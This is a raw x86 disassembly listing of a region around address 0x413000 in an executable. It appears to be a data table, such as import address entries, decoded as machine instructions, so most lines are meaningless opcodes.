  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0xc3000000
  413429:	dec    eax
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	ret    
  41342d:	cmp    al,BYTE PTR [ebx]
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
